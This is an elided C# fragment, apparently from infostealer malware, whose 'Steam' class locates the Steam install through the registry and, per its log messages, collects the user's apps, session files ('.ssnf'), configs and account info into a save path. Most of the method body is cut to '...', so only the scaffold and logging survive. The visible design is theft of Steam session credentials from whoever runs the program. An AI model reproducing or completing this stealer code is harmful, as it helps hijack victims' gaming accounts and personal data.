...
namespace spasibozapas
{
    internal sealed class Steam
    {
        ...
        public static bool GetSteamSession(string sSavePath)
        {
            ...
            if (rkSteam == null)
                return deepside.Logging.Log("Steam >> Application path not found in registry", false);

            string sSteamPath = rkSteam.GetValue("SteamPath").ToString();
            if (!Directory.Exists(sSteamPath))
                return deepside.Logging.Log("Steam >> Application directory not found", false);
            ...
            catch (Exception ex) { deepside.Logging.Log("Steam >> Failed collect steam apps\n" + ex); }
            ...
            catch (Exception ex) { deepside.Logging.Log("Steam >> Failed collect steam .ssnf files\n" + ex); }
            ...
            catch (Exception ex) { deepside.Logging.Log("Steam >> Failed collect steam configs\n" + ex); }
            ...
            catch (Exception ex) { deepside.Logging.Log("Steam >> Failed collect steam info\n" + ex); }
